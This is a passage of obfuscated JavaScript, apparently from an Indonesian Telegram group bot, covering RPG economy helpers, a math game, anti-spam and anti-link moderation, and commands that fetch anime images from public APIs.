_0x1ce978[_0x3b1ba6(0x1f68)](_0x3d90ca,_0x747ed3);},'UQuEk':_0x503762(0x54a)+'salahan\x20sa'+_0x503762(0x24aa)+_0x503762(0x21d0)};if(_0x1ce978[_0x503762(0x1607)](_0x1ce978[_0x503762(0x59d)],_0x1ce978[_0x503762(0x1e28)]))_0x309ed0[_0x503762(0x15e)](_0x5194a2),_0x57733d['RGJwX'](_0x22699b,_0x57733d[_0x503762(0x2eb3)]);else try{fs[_0x503762(0x22b5)+_0x503762(0xfd5)](_0x3c5dd0,JSON[_0x503762(0x1cf5)](_0x40c2c6,null,0x2),_0x1ce978[_0x503762(0x8b9)]),console['log']('Data\x20RPG\x20b'+_0x503762(0x1d6f)+_0x503762(0x1469)+_0x503762(0x1712)+_0x503762(0x723));}catch(_0x9bf3af){console[_0x503762(0x15e)](_0x1ce978[_0x503762(0x2b7f)],_0x9bf3af);}},_0x57edc3=await _0x1ce978[_0x240d04(0x285d)](_0x182219),_0x4e3929=_0x1ce978[_0x240d04(0x2719)](String,_0x23c0de[_0x240d04(0x960)][_0x240d04(0x24b)]['id']),_0x69d638=_0x57edc3[_0x240d04(0x10ad)][_0x240d04(0x55c)](_0x4e3929),_0x5f5dc7=_0x47bc3f=>{const _0x5a7646=_0x240d04;let _0x3eb46b=Math[_0x5a7646(0xf02)](_0x47bc3f/0x36ee80),_0x33c79a=_0x1ce978[_0x5a7646(0x82d)](Math[_0x5a7646(0xf02)](_0x47bc3f/0xea60),0x3c),_0x1f6a16=Math[_0x5a7646(0xf02)](_0x1ce978['qTZTI'](_0x47bc3f,0x3e8))%0x3c;return[_0x3eb46b,_0x33c79a,_0x1f6a16][_0x5a7646(0x16e6)](_0x46963c=>_0x46963c['toString']()['padStart'](0x2,0x0))[_0x5a7646(0x86e)](':');},_0x4edd0b=_0x9f3be8=>{const _0x320d3d=_0x240d04;if(_0x1ce978['BOAWH'](_0x1ce978[_0x320d3d(0xc2b)],_0x320d3d(0xef3))){const _0x617515={'money':'💰','kerja':'🔨','waktu':'⏰'};return _0x617515[_0x9f3be8]||'';}else return _0x57f7a1(_0x1ce978[_0x320d3d(0x257a)]);},_0x246ab0={'emoticon'(_0x525da2){const _0x37ceba=_0x240d04;if(_0x1ce978[_0x37ceba(0x2d14)](_0x1ce978['rhHoG'],_0x1ce978[_0x37ceba(0xd1c)]))return _0x1ce978[_0x37ceba(0x985)](_0x54ec45,_0x1ce978['KdBjs']);else{_0x525da2=_0x525da2[_0x37ceba(0x25f7)+'e']();const _0x357cd5={'money':'💵','exp':'✨','limit':'🎫','potion':'🧪','diamond':'💎','iron':'⛓️','string':_0x1ce978[_0x37ceba(0xb2c)],'wood':'🪵','rock':'🪨','sword':'⚔️','pickaxe':'⛏️','fishingrod':'🎣','armor':'🥼','atm':'💳','emerald':'💚','gold':'🪙'},_0x88f1ca=Object[_0x37ceba(0x1adb)](_0x357cd5)['map'](_0x38b5dd=>[_0x38b5dd,new RegExp(_0x38b5dd,'gi')])['filter'](([_0x5629fc,_0x5ed21d])=>_0x5ed21d[_0x37ceba(0x1dc7)](_0x525da2));if(!_0x88f1ca[_0x37ceba(0x2b45)])return'';return _0x357cd5[_0x88f1ca[0x0][0x0]];}}};function _0x2ca95e(_0x3a703f){const _0x559aaa=_0x240d04;if(typeof _0x3a703f!=='string')return'';return _0x1ce978[_0x559aaa(0x2a0e)](_0x3a703f[_0x559aaa(0x211a)](0x0)[_0x559aaa(0xdd3)+'e'](),_0x3a703f['slice'](0x1));}function _0x53c5da(_0x573295){const _0x434cb9=_0x240d04;if(_0x1ce978['vNEZp']!=='pirMt')return Math[_0x434cb9(0xf02)](_0x1ce978[_0x434cb9(0x1ae3)](0.3,Math['sqrt'](_0x573295)));else{let _0x2b60b0=_0x182b9d[_0x434cb9(0xf02)](_0x43f132/0x36ee80),_0x1a0c69=_0x1ce978['FHfsx'](_0x4e01b4[_0x434cb9(0xf02)](_0x1ce978[_0x434cb9(0x279d)](_0x4f9d35,0xea60)),0x3c),_0x49c54f=_0x1ce978[_0x434cb9(0x2c9d)](_0x586a9a[_0x434cb9(0xf02)](_0x1ce978['lHtqH'](_0x42d7fc,0x3e8)),0x3c);return _0x1a0c69+_0x434cb9(0x1e9d)+_0x49c54f+_0x434cb9(0xeac);}}function _0x99d01b(_0x138c53){const _0x71709b=_0x240d04;return Math[_0x71709b(0xf02)](_0x1ce978[_0x71709b(0x711)](_0x1ce978[_0x71709b(0x16c)](_0x138c53,0.3),0x2));}async function _0x2c00a5(_0x10c0be,_0x3173f4,_0x30a271){const _0x25aa3b=_0x240d04,_0x5a4336=_0x3173f4[_0x10c0be],_0x5c1b33=_0x5a4336['level']||0x0,_0x504e6d=_0x1ce978[_0x25aa3b(0x6b8)](_0x53c5da,_0x5a4336[_0x25aa3b(0x21ac)]);if(_0x504e6d>_0x5c1b33){const _0x200503=_0x1ce978['Nicrx'](_0x504e6d,_0x5c1b33);_0x5a4336[_0x25aa3b(0x2736)]=_0x504e6d,_0x5a4336[_0x25aa3b(0xd24)]+=_0x1ce978[_0x25aa3b(0x15c4)](_0x200503,0x1f4),_0x1ce978[_0x25aa3b(0x1ea6)](_0x30a271,_0x25aa3b(0x1367)+_0x25aa3b(0x2974)+_0x25aa3b(0xfdf)+_0x504e6d+'!\x0aBonus:\x20+'+_0x1ce978[_0x25aa3b(0x14e5)](_0x200503,0x1f4)+_0x25aa3b(0x2ca4));}}function _0x3c28d1(_0x184fd7){const _0x21dbb1=_0x240d04,_0x51980d={'EQljl':function(_0x722e1,_0xe86246){return _0x1ce978['LDqCu'](_0x722e1,_0xe86246);}};return _0x184fd7['split']('')[_0x21dbb1(0x16e6)]((_0x34613e,_0x3580cf)=>{const _0x1d8029=_0x21dbb1;if(_0x34613e==='\x20')return'\x20';return _0x51980d[_0x1d8029(0xa7c)](_0x3580cf%0x2,0x0)?_0x34613e:'_';})[_0x21dbb1(0x86e)]('');}global[_0x240d04(0xebc)]=global[_0x240d04(0xebc)]||{},global[_0x240d04(0x1b0d)]=global[_0x240d04(0x1b0d)]||{},global['mathGame']=global['mathGame']||{};function _0x4edfd7(_0x1b6a6b,_0x47bbc6,_0x193847){const _0x1e9e87=_0x240d04;if(_0x1ce978[_0x1e9e87(0x22a1)]===_0x1ce978[_0x1e9e87(0x22a1)]){const [_0x254321,_0x5ad24f,_0x826f26,_0x14fc4a,_0xacd85b,_0x49441c,_0x40f59f]=_0x47bbc6[_0x1b6a6b];let _0x26fb5a=_0x1ce978[_0x1e9e87(0x130c)](_0xcfbbe7,_0x254321,_0x5ad24f),_0x5caea2=_0x1ce978[_0x1e9e87(0x130c)](_0xcfbbe7,_0x826f26,_0x14fc4a),_0x155ee4=_0x1ce978[_0x1e9e87(0x1b37)](pickRandom,[..._0xacd85b]),_0x4ddb28=new Function('return\x20'+_0x26fb5a+'\x20'+_0x155ee4[_0x1e9e87(0x1ba2)]('/','*')+'\x20'+(_0x5caea2<0x0?'('+_0x5caea2+')':_0x5caea2))();if(_0x1ce978[_0x1e9e87(0x397)](_0x155ee4,'/'))[_0x26fb5a,_0x4ddb28]=[_0x4ddb28,_0x26fb5a];return{'str':_0x26fb5a+'\x20'+_0x193847[_0x155ee4]+'\x20'+_0x5caea2,'mode':_0x1b6a6b,'time':_0x49441c,'bonus':_0x40f59f,'result':_0x4ddb28};}else return _0x8e2e2d[_0x1e9e87(0x15e)](_0x28d332),_0x1ce978[_0x1e9e87(0x110d)](_0x3d5ca5,_0x1ce978[_0x1e9e87(0x275a)]);}function _0xcfbbe7(_0x3f4854,_0x47d2b4){const _0x9f1def=_0x240d04;if(_0x1ce978[_0x9f1def(0x299)](_0x1ce978[_0x9f1def(0x20b9)],_0x1ce978[_0x9f1def(0x20b9)]))return _0x1ce978[_0x9f1def(0x2804)](_0x2f0bff,_0x9f1def(0x2a71)+_0x9f1def(0x180e)+'ar.\x0aGunaka'+'n\x20/unreg\x20j'+_0x9f1def(0x34c)+_0x9f1def(0x1377)+_0x9f1def(0x24de));else{if(_0x1ce978[_0x9f1def(0x1716)](_0x3f4854,_0x47d2b4))[_0x3f4854,_0x47d2b4]=[_0x47d2b4,_0x3f4854];return Math['floor'](_0x1ce978[_0x9f1def(0x26c4)](_0x1ce978[_0x9f1def(0x20d0)](_0x47d2b4,_0x3f4854),Math[_0x9f1def(0x24f1)]())+_0x3f4854);}}const _0x14d109=async(_0x1b1665,_0x1b0a8e)=>{const _0x473dd2=_0x240d04;if(_0x1ce978['scrZu'](_0x1ce978['fovnW'],_0x1ce978[_0x473dd2(0x20d1)]))return delete _0x31eb03[_0x59878d],_0x3e18b0(),_0x1ce978[_0x473dd2(0x6b8)](_0x9a292b,_0x1ce978[_0x473dd2(0x2231)]);else try{const _0x14a358=await _0x25840a[_0x473dd2(0x1986)]['getChatMem'+_0x473dd2(0x2089)](_0x1b1665,_0x1b0a8e);return[_0x1ce978[_0x473dd2(0xcb8)],'creator']['includes'](_0x14a358[_0x473dd2(0xa58)]);}catch{if(_0x1ce978[_0x473dd2(0x2116)](_0x1ce978[_0x473dd2(0x2ba9)],_0x1ce978['BWsLw']))for(let _0x22be46 of _0x5d8a54['images']){_0x1a8b39[_0x473dd2(0x2705)+_0x473dd2(0x39a)]({'url':_0x22be46},{'caption':_0xa4908d['ok']});}else return![];}},_0x460707=_0x1ce978[_0x240d04(0x6b3)];let _0x5a4807=fs[_0x240d04(0x10c9)](_0x460707)?JSON[_0x240d04(0x1c34)](fs['readFileSy'+'nc'](_0x460707)):{};function _0x5eca1e(){const _0xd7b832=_0x240d04;fs[_0xd7b832(0x22b5)+_0xd7b832(0xfd5)](_0x460707,JSON[_0xd7b832(0x1cf5)](_0x5a4807,null,0x2));}const {enableWelcome:_0x17e1e7,disableWelcome:_0x19ca5e,isWelcomeEnabled:_0x5617d5}=_0x1ce978['LCvNo'](require,_0x1ce978[_0x240d04(0x1f7c)]);if(_0x56b430&&antiSpamGroup[_0x63f3a3]){if(_0x1ce978['FasLx'](_0x1ce978['iKCDI'],_0x1ce978[_0x240d04(0x2f1)])){const _0x2a8d46=Date[_0x240d04(0x104e)]();if(!spamWarning[_0x63f3a3])spamWarning[_0x63f3a3]={};if(!spamWarning[_0x63f3a3][_0xb65b97])spamWarning[_0x63f3a3][_0xb65b97]={'warn':0x0,'last':0x0};const _0x3699b1=_0x2a8d46-spamWarning[_0x63f3a3][_0xb65b97]['last'];spamWarning[_0x63f3a3][_0xb65b97][_0x240d04(0x234e)]=_0x2a8d46;if(!await _0x14d109(_0x63f3a3,_0xb65b97)){if(_0x1ce978['Hvfmy'](_0x1ce978[_0x240d04(0x2a27)],_0x1ce978['PoftC'])){if(_0x1ce978[_0x240d04(0x151c)](_0x3699b1,antiSpamGroup[_0x63f3a3][_0x240d04(0x48f)])){spamWarning[_0x63f3a3][_0xb65b97]['warn']++;try{_0x1ce978[_0x240d04(0x2195)](_0x1ce978['qaiWW'],_0x1ce978[_0x240d04(0x1997)])?_0x2e7b26[_0x44fe9d]-=_0x17a842:await _0x25840a[_0x240d04(0x1986)][_0x240d04(0x1778)+_0x240d04(0x29b8)](_0x63f3a3,_0x23c0de[_0x240d04(0x960)][_0x240d04(0x6bd)]);}catch{}if(_0x1ce978[_0x240d04(0x148a)](spamWarning[_0x63f3a3][_0xb65b97][_0x240d04(0x1351)],0x3)){if(_0x1ce978['LDqCu'](_0x1ce978[_0x240d04(0x21fe)],_0x1ce978[_0x240d04(0x730)]))_0x39edc1=_0x3e5e62[_0x240d04(0xfc3)](_0x402572=>_0x402572!==_0x20ae49),_0x1ce978[_0x240d04(0x285d)](_0x347769);else try{await _0x25840a[_0x240d04(0x1986)][_0x240d04(0xae8)+'e'](_0x63f3a3,_0x240d04(0x8f6)+_0x4073e8+('\x20berhenti\x20'+_0x240d04(0x224d))+spamWarning[_0x63f3a3][_0xb65b97]['warn']+_0x240d04(0x2c35),{'reply_to_message_id':_0x23c0de[_0x240d04(0x960)][_0x240d04(0x6bd)],'parse_mode':_0x1ce978['AWHzb']});}catch(_0x55457f){_0x55457f[_0x240d04(0x547)]&&_0x1ce978[_0x240d04(0x11b)](_0x55457f[_0x240d04(0x547)][_0x240d04(0x599)],0x190)?await _0x25840a[_0x240d04(0x1986)][_0x240d04(0xae8)+'e'](_0x63f3a3,'⚠️\x20@'+_0x4073e8+(_0x240d04(0x212b)+'spam!\x20(')+spamWarning[_0x63f3a3][_0xb65b97][_0x240d04(0x1351)]+'/3)',{'parse_mode':_0x1ce978[_0x240d04(0xa1b)]}):console[_0x240d04(0x15e)](_0x55457f);}}else{try{await _0x25840a[_0x240d04(0x1986)]['kickChatMe'+_0x240d04(0x28c5)](_0x63f3a3,_0xb65b97),await _0x25840a[_0x240d04(0x1986)][_0x240d04(0xae8)+'e'](_0x63f3a3,_0x240d04(0xabc)+_0x4073e8+(_0x240d04(0x2ab7)+'rena\x20spam\x20'+_0x240d04(0x1e49)),{'parse_mode':'Markdown'});}catch{await _0x25840a[_0x240d04(0x1986)][_0x240d04(0xae8)+'e'](_0x63f3a3,_0x240d04(0x976)+_0x240d04(0x2043)+_0x4073e8+('.\x20Pastikan'+'\x20bot\x20admin'+'.'),{'parse_mode':_0x1ce978['AWHzb']});}delete spamWarning[_0x63f3a3][_0xb65b97];}return;}else spamWarning[_0x63f3a3][_0xb65b97][_0x240d04(0x1351)]=0x0;}else return _0x1ce978['ozfOG'](_0x1bf6f2,'Silahkan\x20m'+_0x240d04(0x11dc)+_0x1ce978[_0x240d04(0x6b8)](_0x50289d,_0x3a491a)+(_0x240d04(0x20ef)+'menjalanka'+_0x240d04(0xf96)+_0x240d04(0x752)));}}else _0x1ed973(_0x20839e,_0x4d4f41[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2a3c)]);}if(_0x56b430&&antiLinkGroup[_0x63f3a3]){const _0x2fea64=/(https?:\/\/[^\s]+)|(t\.me\/[^\s]+)|(telegram\.me\/[^\s]+)/i;if(_0x2fea64['test'](_0x3ed05e)&&!await _0x1ce978['eYpDx'](_0x14d109,_0x63f3a3,_0xb65b97)){if(_0x1ce978[_0x240d04(0xa7d)](_0x1ce978[_0x240d04(0xf83)],_0x1ce978['cgvrY']))_0x1ce978['vBmJN'](_0x56e1b5,_0x5a89b1,_0x3fae88[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x1861)]);else{try{await _0x25840a[_0x240d04(0x1986)]['deleteMess'+_0x240d04(0x29b8)](_0x63f3a3,_0x23c0de[_0x240d04(0x960)][_0x240d04(0x6bd)]),await _0x25840a[_0x240d04(0x1986)]['sendMessag'+'e'](_0x63f3a3,_0x240d04(0xbe5)+_0x240d04(0xe5a)+_0x240d04(0xbf6)+_0x4073e8+'!',{'parse_mode':_0x1ce978[_0x240d04(0xa1b)]});}catch(_0x3a93ff){_0x1ce978[_0x240d04(0x245f)](_0x240d04(0x2d1b),_0x1ce978['jRJiY'])?(_0x3e309d['error'](_0x2e709d),_0x1ce978['ZiWTN'](_0x2a6d1d,_0x1ce978[_0x240d04(0x7c4)])):console['error'](_0x1ce978[_0x240d04(0xc09)],_0x3a93ff[_0x240d04(0x960)]);}return;}}}switch(_0x3e6565){case _0x240d04(0x1cad):{if(_0x1ce978['lkttG']!==_0x1ce978['lkttG']){const _0x556f39=_0x1ce978[_0x240d04(0x640)](_0x10533b,_0xfc2e11);_0x498612[_0x240d04(0x2736)]=_0x4408cf,_0x33ca9c[_0x240d04(0xd24)]+=_0x1ce978[_0x240d04(0x1d20)](_0x556f39,0x1f4),_0x441b30('✨\x20*LEVEL\x20U'+_0x240d04(0x2974)+_0x240d04(0xfdf)+_0x34deca+'!\x0aBonus:\x20+'+_0x1ce978['GvmPR'](_0x556f39,0x1f4)+_0x240d04(0x2ca4));}else _0x1ce978[_0x240d04(0x20b1)](_0x476bfb,_0x1ce978['mutWI']);}break;case _0x1ce978[_0x240d04(0x311)]:case _0x1ce978[_0x240d04(0x1070)]:{_0x1ce978[_0x240d04(0x389)](_0x1ce978[_0x240d04(0x25bc)],_0x240d04(0x6ae))?_0x4f0bb1[_0x175faf]={'count':0x1,'last':_0x525fe5,'blockedUntil':0x0}:(await _0x23c0de[_0x240d04(0x1ad9)+'t'](OWNER_NUMBER,OWNER_NAME),_0x1ce978[_0x240d04(0x516)](_0x476bfb,'My\x20lord\x20['+OWNER_NAME+']('+OWNER[0x0]+_0x240d04(0x5c3)));}break;case'sc':case _0x1ce978['VjxBQ']:case'scrip':{if(!_0x3cd341)return _0x1ce978['aFEee'](_0x476bfb,_0x1ce978['CISDX']);_0x23c0de['reply'](_0x1ce978['schrV'],{'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1ad8)],'url':_0x1ce978[_0x240d04(0xe75)]}]]}});}break;case _0x240d04(0x23e7):case _0x1ce978[_0x240d04(0xd34)]:{_0x476bfb(lang[_0x240d04(0x2a1f)]);}break;case _0x1ce978['ORvJy']:{if(_0x1ce978[_0x240d04(0x21e6)](_0x240d04(0x2726),_0x1ce978[_0x240d04(0x2925)]))return _0x1ce978[_0x240d04(0x6b8)](_0x48a379,_0x1ce978[_0x240d04(0x24a8)]);else _0x1ce978['WvtUE'](_0x476bfb,_0x240d04(0x15fe)+_0x240d04(0xe70)+_0x23c0de[_0x240d04(0x960)]['chat']['id']);}break;case _0x1ce978['gyvQA']:case _0x240d04(0x2a46):case'help':{if(_0x1ce978['ikIPi'](_0x1ce978[_0x240d04(0x2927)],_0x1ce978[_0x240d04(0x2927)])){hitall='-';let _0xd636e1=new Date(new Date()+0x36ee80),_0x456b97=_0xd636e1['toLocaleDa'+_0x240d04(0x20b7)]('en',{'weekday':_0x1ce978[_0x240d04(0x2ef7)]}),_0x6a62d6=[_0x1ce978[_0x240d04(0x267a)],_0x1ce978[_0x240d04(0xf31)],_0x1ce978[_0x240d04(0x1e8f)],_0x240d04(0x1090),_0x240d04(0x1b5e)][_0x1ce978[_0x240d04(0x2dd3)](Math[_0x240d04(0xf02)](_0xd636e1/0x50ae4c0),0x5)],_0x3cba1a=_0xd636e1[_0x240d04(0x2b98)+'teString']('en',{'day':_0x240d04(0x9d3),'month':_0x240d04(0x2047),'year':_0x240d04(0x9d3)}),_0x563d58=Intl[_0x240d04(0x1619)+_0x240d04(0x691)](_0x1ce978[_0x240d04(0x28e8)]('en',_0x1ce978['zdZFy']),{'day':_0x240d04(0x9d3),'month':_0x1ce978[_0x240d04(0x2ef7)],'year':_0x1ce978[_0x240d04(0x18dd)]})[_0x240d04(0x2579)](_0xd636e1);lang[_0x240d04(0x226e)](_0x23c0de,THUMBNAIL,_0x19007e,OWNER_NAME,OWNER,_0x1ec495,hitall,_0x4e7c39,os,simple,_0x456b97,_0x3cba1a,_0x563d58,_0x4073e8,_0x3cd341,_0x23c0de[_0x240d04(0x960)]['from']['id'][_0x240d04(0x2cb7)]());}else try{const _0x42da8d=_0x33e15f[_0x240d04(0x2113)+'nc'](_0x4c4b15,_0x240d04(0x765));return _0x11d5c6[_0x240d04(0x1c34)](_0x42da8d);}catch(_0x5bb5ac){return _0x1fe4ee['error'](_0x240d04(0x276d)+_0x240d04(0xfff)+_0x240d04(0x2d3d),_0x5bb5ac),{};}}break;case'akame':case _0x1ce978['hhZmR']:case _0x1ce978[_0x240d04(0x13f8)]:case _0x1ce978[_0x240d04(0x2cec)]:case _0x1ce978[_0x240d04(0x1dcf)]:case _0x1ce978[_0x240d04(0x278e)]:case _0x1ce978[_0x240d04(0x6c3)]:case'hinata':case _0x1ce978[_0x240d04(0x17f1)]:case _0x1ce978['HuphH']:case _0x1ce978['sJksU']:case _0x1ce978[_0x240d04(0x26c5)]:case _0x240d04(0x1439):case _0x1ce978[_0x240d04(0x2c74)]:case _0x1ce978[_0x240d04(0x2167)]:case _0x240d04(0x928)+'ayuki':case _0x1ce978[_0x240d04(0x994)]:case _0x240d04(0x1937):case _0x1ce978[_0x240d04(0x176e)]:case _0x1ce978[_0x240d04(0x2e73)]:case _0x240d04(0x24bf)+'u':case _0x1ce978[_0x240d04(0x2b27)]:case _0x1ce978[_0x240d04(0x7fa)]:case _0x1ce978[_0x240d04(0x231)]:case _0x1ce978[_0x240d04(0xb8c)]:case _0x1ce978['WugeS']:case _0x240d04(0x1032):case _0x1ce978[_0x240d04(0x105a)]:case _0x1ce978['BkcfT']:case _0x1ce978[_0x240d04(0x11f1)]:case'ussop':case _0x1ce978[_0x240d04(0x1dce)]:case _0x1ce978[_0x240d04(0x940)]:case _0x1ce978[_0x240d04(0xacb)]:case _0x1ce978[_0x240d04(0x2b2)]:case _0x240d04(0xd3d):case _0x1ce978['AdyKc']:case _0x1ce978['eHDFh']:case _0x1ce978[_0x240d04(0x2250)]:case _0x1ce978[_0x240d04(0x2c8a)]:case _0x1ce978[_0x240d04(0x10c8)]:case'natsu':case _0x1ce978[_0x240d04(0x25f0)]:{_0x1ce978[_0x240d04(0x1fb2)](_0x476bfb,lang[_0x240d04(0x172a)]);try{const _0x30a836=await _0x1ce978[_0x240d04(0xcab)](fetch,_0x240d04(0x25fb)+'i.siputzx.'+_0x240d04(0x219a)+_0x240d04(0x2d67)+_0x240d04(0x1714)+_0x240d04(0x29cf)+'me\x20'+_0x3e6565);if(!_0x30a836['ok'])throw new Error('HTTP\x20'+_0x30a836[_0x240d04(0xa58)]);const _0x16686f=await _0x30a836[_0x240d04(0x1314)]();if(!_0x16686f||!_0x16686f['data']||!Array[_0x240d04(0x1a7e)](_0x16686f[_0x240d04(0x2bb6)])||_0x16686f[_0x240d04(0x2bb6)][_0x240d04(0x2b45)]===0x0)return _0x476bfb(_0x1ce978[_0x240d04(0x6b7)]);const _0x4188da=_0x16686f[_0x240d04(0x2bb6)],_0x14af37=_0x4188da[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1973)](Math['random'](),_0x4188da[_0x240d04(0x2b45)]))];if(!_0x14af37||!_0x14af37['image_url'])return _0x476bfb(_0x1ce978[_0x240d04(0x46f)]);_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x14af37[_0x240d04(0x1895)]},{'caption':lang['ok'],'parse_mode':_0x240d04(0x2dc5),'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0xe07)],'callback_data':_0x1ce978[_0x240d04(0xa84)]+_0x83219d}]]}});}catch(_0x4a1797){if(_0x1ce978[_0x240d04(0x1f43)](_0x1ce978[_0x240d04(0x7c9)],_0x1ce978[_0x240d04(0x7c9)])){const _0x4690bc=_0x44a40d[_0x240d04(0x3de)](_0x2d1058=>_0x2d1058[_0x240d04(0x1357)]==='💥');_0xd6a11a[_0x520917]&&(_0x1ce978[_0x240d04(0x985)](_0x460778,_0x240d04(0x172)+_0x240d04(0x1c69)+_0x240d04(0x1240)+_0x240d04(0x1be8)+_0x4690bc[_0x240d04(0x19b5)]),delete _0x52d3a4[_0x5cc3a5]);}else _0x476bfb(_0x240d04(0x251c));}}break;case _0x1ce978[_0x240d04(0x1868)]:{const _0x3afcc0=await _0x1ce978[_0x240d04(0x525)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0xbaf)+'fu'),_0x1d7621=await _0x3afcc0[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x1d7621[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978['HITAz'],'callback_data':_0x1ce978['WMNNb']+_0x83219d},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978[_0x240d04(0x183e)](_0x1ce978['fcUdv'],_0x83219d)}]]}});}break;case _0x240d04(0x2c78):{const _0x379b1b=await _0x1ce978['bQjwO'](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+'cs/sfw/nek'+'o'),_0x38eac6=await _0x379b1b[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x38eac6[_0x240d04(0x96e)]},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x1e77)](_0x1ce978[_0x240d04(0x8c7)],_0x83219d)},{'text':_0x240d04(0xe7c),'callback_data':_0x1ce978['rbATB'](_0x1ce978[_0x240d04(0xa84)],_0x83219d)}]]}});}break;case _0x1ce978[_0x240d04(0x1c67)]:{if(_0x1ce978[_0x240d04(0x109d)](_0x1ce978[_0x240d04(0x8d3)],_0x1ce978[_0x240d04(0x1abc)])){const _0x58e909={'money':'💰','kerja':'🔨','waktu':'⏰'};return _0x58e909[_0x50ef38]||'';}else{const _0x1a4170=await _0x1ce978[_0x240d04(0x1509)](fetch,_0x240d04(0x25fb)+_0x240d04(0x1150)+_0x240d04(0x1d0e)+'nobu'),_0x11ee27=await _0x1a4170[_0x240d04(0x1314)]();_0x23c0de[_0x240d04(0x2705)+'hoto']({'url':_0x11ee27['url']},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978['HITAz'],'callback_data':_0x1ce978[_0x240d04(0x1816)](_0x1ce978[_0x240d04(0xcbb)],_0x83219d)},{'text':_0x240d04(0xe7c),'callback_data':_0x1ce978[_0x240d04(0x2c95)](_0x240d04(0x147c),_0x83219d)}]]}});}}break;case _0x1ce978['kSDeM']:{const _0x3adaa4=await fetch('https://ap'+_0x240d04(0x1150)+_0x240d04(0x1d5)+'umin'),_0x224fcb=await _0x3adaa4['json']();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x224fcb['url']},{'caption':lang['ok'],'parse_mode':_0x1ce978[_0x240d04(0x1117)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x1fc8)],'callback_data':_0x1ce978[_0x240d04(0x2109)](_0x1ce978[_0x240d04(0x18f7)],_0x83219d)},{'text':_0x1ce978[_0x240d04(0xe08)],'callback_data':_0x1ce978[_0x240d04(0x230d)](_0x1ce978['fcUdv'],_0x83219d)}]]}});}break;case _0x240d04(0x2bae):case _0x1ce978[_0x240d04(0x251b)]:case'reurl':{const _0x1afaac=_0x23c0de['message'],_0x5b4847=_0x1afaac[_0x240d04(0x278b)+'essage']||{},_0x530dc5=_0x1afaac[_0x240d04(0x1994)+'erty'](_0x240d04(0x2a20)),_0x36c98e=_0x1afaac[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x81d)]),_0x5c9274=_0x1afaac[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x19a1)]),_0x385387=_0x1afaac[_0x240d04(0x1994)+_0x240d04(0xe40)]('sticker'),_0x118d43=_0x1afaac[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x5bc)]),_0x28924f=_0x1afaac[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978['RkDCi']),_0x698b49=_0x1afaac['hasOwnProp'+_0x240d04(0xe40)](_0x1ce978['uFnlU']),_0x489868=_0x1afaac['hasOwnProp'+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x29ec)]),_0x290e89=_0x1afaac[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978['fOdwj']),_0x56d1a9=_0x5b4847[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978['nNgRY']),_0x39ef1a=_0x5b4847[_0x240d04(0x1994)+'erty'](_0x1ce978[_0x240d04(0x81d)]),_0x3bf0ba=_0x5b4847[_0x240d04(0x1994)+'erty'](_0x1ce978[_0x240d04(0x19a1)]),_0x34ef9d=_0x5b4847[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x7a4)]),_0xc9671d=_0x5b4847[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x5bc)]),_0x3d7204=_0x5b4847[_0x240d04(0x1994)+_0x240d04(0xe40)](_0x1ce978[_0x240d04(0x2b54)]),_0x2f1c8b=_0x5b4847['hasOwnProp'+'erty'](_0x1ce978[_0x240d04(0x233)]),_0x3dbd7e=_0x5b4847['hasOwnProp'+_0x240d04(0xe40)](_0x1ce978['beBLL']),_0x2d18d1=_0x1ce978[_0x240d04(0x2526)](_0x530dc5,_0x36c98e)||_0x5c9274||_0x385387||_0x118d43||_0x28924f||_0x698b49||_0x489868||_0x56d1a9||_0x39ef1a||_0x3bf0ba||_0x34ef9d||_0xc9671d||_0x3d7204||_0x2f1c8b||_0x3dbd7e;if(!_0x2d18d1)return _0x1ce978['iqlvn'](_0x476bfb,_0x1ce978[_0x240d04(0x1835)]);const _0x5dd097=_0x290e89?_0x5b4847:_0x1afaac;let 